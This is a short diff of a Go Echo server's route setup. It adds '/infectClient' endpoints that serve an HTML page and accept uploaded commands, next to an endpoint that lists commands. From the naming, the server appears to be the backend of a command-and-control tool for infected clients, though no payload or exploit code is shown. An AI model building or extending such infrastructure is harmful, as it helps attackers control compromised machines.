@@ -14,12 +14,14 @@ func SetupRoutes() {
 	if !exist {
 		port = "8080"
 	}
-	e.POST("/commands", controller.UploadCommand)
-	e.GET("/commands", controller.GetCommands)
-	e.GET("/", func(c echo.Context) error {
-		c.Response().Write([]byte(""))
+	e.GET("/infectClient", func(c echo.Context) error {
+
+		c.File("view/infectClient.html")
 		return nil
 	})
+	e.POST("/infectClient", controller.UploadCommand)
+	e.GET("/commands", controller.GetCommands)
+	e.Static("/static", "static")
 
 	e.Logger.Fatal(e.Start(":" + port))
 }
